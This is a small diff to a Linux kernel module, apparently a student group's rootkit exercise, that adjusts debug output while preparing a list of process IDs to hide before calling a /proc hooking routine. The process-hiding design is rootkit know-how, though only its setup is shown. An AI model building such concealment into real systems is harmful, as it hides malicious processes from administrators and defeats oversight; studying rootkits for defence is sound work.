@@ -92,14 +92,16 @@ static int __init _init_module(void)
     int i;
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
 
+    OUR_DEBUG("We are now going to hide the following PIDs:\n");
     char_pids_to_hide = kmalloc(pids_count * sizeof(char*), GFP_KERNEL);
     for(i = 0; i<pids_count; i++){
         int sizeOfPidString = log10(pids_to_hide[i])+1; // +1 for \0
         char *buf = kmalloc(sizeOfPidString * sizeof(char), GFP_KERNEL);
         sprintf(buf, "%d", pids_to_hide[i]);
         char_pids_to_hide[i] = buf;
-        OUR_DEBUG("%s", buf);
+        OUR_DEBUG("%s\n", buf);
     }
+    OUR_DEBUG("\n");
 
     hook_proc();
 
